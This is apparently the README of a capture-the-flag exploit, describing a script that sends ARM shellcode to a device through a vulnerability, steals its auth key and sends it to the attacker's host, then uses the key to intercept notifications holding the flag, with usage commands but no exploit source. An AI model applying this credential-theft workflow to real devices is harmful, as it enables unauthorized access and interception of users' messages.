Exploit sends shell to device and execute it by using vulnerability. Shell steals auth key and sends its over the network to the remote attacker's host.
You can see shell's source assembler code in shell.s. To compile shell you need GCC ARM toolchain and then launch ./compile_shell.sh

To run exploit launch ./sploit.py. This script expects as command line arguments IP address of attacker's host and port to open:
./sploit.py 10.60.0.6 9999
Script reads shell.bin, authenticates on server, builds and sends malicious notifications, which contains some message, shell, ip address and port.
After all it outputs stolen auth key on stdout.

Use auth key to intercept notifications, some of them contains flag
